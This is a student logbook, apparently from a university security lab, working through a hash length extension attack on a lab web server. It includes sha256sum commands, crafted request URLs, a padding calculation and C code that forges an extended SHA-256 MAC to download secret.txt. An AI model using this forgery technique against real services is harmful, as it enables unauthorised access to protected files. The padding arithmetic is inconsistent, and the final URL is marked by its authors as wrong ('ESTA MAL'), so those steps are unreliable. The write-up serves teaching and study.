## Hash Length Extension

#### Task 1: Send Request to List Files

First we picked a uid number from the ```key.txt```file: **1001:123456**.

We built the message: 
```
123456:myname=MariaVieira&uid=1001&lstcmd=1
```

To calculate the MAC, we ran the command:
```
$ echo -n "123456:myname=MariaVieira&uid=1001&lstcmd=1" | sha256sum
```
The result was **1b7ae954e7654d0df10f49c001b146bcc00341355349f58fd7ce0b0e79e1d06e  -**.

Then, we built the request and sent it using the browser: 
```
http://www.seedlab-hashlen.com/?myname=MariaVieira&uid=1001&lstcmd=1mac=1b7ae954e7654d0df10f49c001b146bcc00341355349f58fd7ce0b0e79e1d06e
```
This didn´t work, so we tried to use 10.9.0.80 in the url:
```
http://10.9.0.80/?myname=MariaVieira&uid=1001&lstcmd=1&mac=1b7ae954e7654d0df10f49c001b146bcc00341355349f58fd7ce0b0e79e1d06e&subid1=20241206-1030-1288-97a0-15adcfd528ba
```
This time, it worked, showing the files successfully:


![Image 1](https://git.fe.up.pt/fsi/fsi2425/logs/l05g06/-/raw/main/Images/Task1_LOGBOOK10_2.png)


Then, we did the download request:
- We had to calculate the MAC again with 
```echo -n "123456:myname=MariaVieira&uid=1001&lstcmd=1&download=secret.txt" | sha256sum```
- Sent the updated url: 
```
http://10.9.0.80/?myname=MariaVieira&uid=1001&lstcmd=1&download=secret.txt&mac=289e9016b7caf160b0b116505c9452ac870b83598d95df94c221c47393d264d5
```

The request was successful, showing the files in LabHome and the content of ```secret.txt```!

![Image 2](https://git.fe.up.pt/fsi/fsi2425/logs/l05g06/-/raw/main/Images/Task1_LOGBOOK10_3.png)

#### Task 2: Create Padding

We already have the message from Task1:
```
123456:myname=MariaVieira&uid=1001&lstcmd=1
```
The length of the message is 43
bytes, so the padding is 64 - 43 = 21 bytes, including 8 bytes of the length field. 

The length of the message in
term of bits is 43 * 8 = 176 = 0x158. 

SHA256 will be performed in the following padded message:
```
123456:myname=MariaVieira&uid=1001&lstcmd=1
\x80
\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
\x00\x00\x01\x58
```

Because of the 21 bytes of padding, we added ```\x00```21 times before the length field.

Converting to URL enconding, we obtained:
```
%80%00%00%00%00%00%00%00%00%00%00%00%00%00%01%58
```


#### Task 3

We changed the file according to our attack:
```
/* length_ext.c */
#include <stdio.h>
#include <arpa/inet.h>
#include <openssl/sha.h>

int main(int argc, const char *argv[])
{
  int i;
  unsigned char buffer[SHA256_DIGEST_LENGTH];
  SHA256_CTX c;
  
  SHA256_Init(&c);
  
  for(i=0; i<64; i++)
    SHA256_Update(&c, "*", 1);
    
  // MAC of the original message M (padded)
  c.h[0] = htole32(0x1b7ae954);
  c.h[1] = htole32(0xe7654d0d);
  c.h[2] = htole32(0xf10f49c0);
  c.h[3] = htole32(0x01b146bc);
  c.h[4] = htole32(0xc0034135);
  c.h[5] = htole32(0x5349f58f);
  c.h[6] = htole32(0xd7ce0b0e);
  c.h[7] = htole32(0x79e1d06e);
  
  // Append additional message
  SHA256_Update(&c, "&download=secret.txt", 20);
  SHA256_Final(buffer, &c);
  
  for(i = 0; i < 32; i++) {
    printf("%02x", buffer[i]);
  }
  printf("\n");
  return 0;
}
```

Then we ran the code, obtaining the new MAC for the extended request:

![Image 3](https://git.fe.up.pt/fsi/fsi2425/logs/l05g06/-/raw/main/Images/Task3_LOGBOOK10.png)

Finally, we could build the url to the attack:

- Request from task1
- PADDING from task2: %80%00%00%00%00%00%00%00%00%00%00%00%00%00%01%58
- MAC from task3: 301f72317f48d9351690d119d77a527b1b236fc6f7992653c91e9014e1f6279d

ESTA MAL

http://10.9.0.80/?myname=MariaVieira&uid=1001&lstcmd=1%80%00%00%00%00%00%00%00%00%00%00%00%00%00%01%58&download=secret.txt&mac=301f72317f48d9351690d119d77a527b1b236fc6f7992653c91e9014e1f6279d



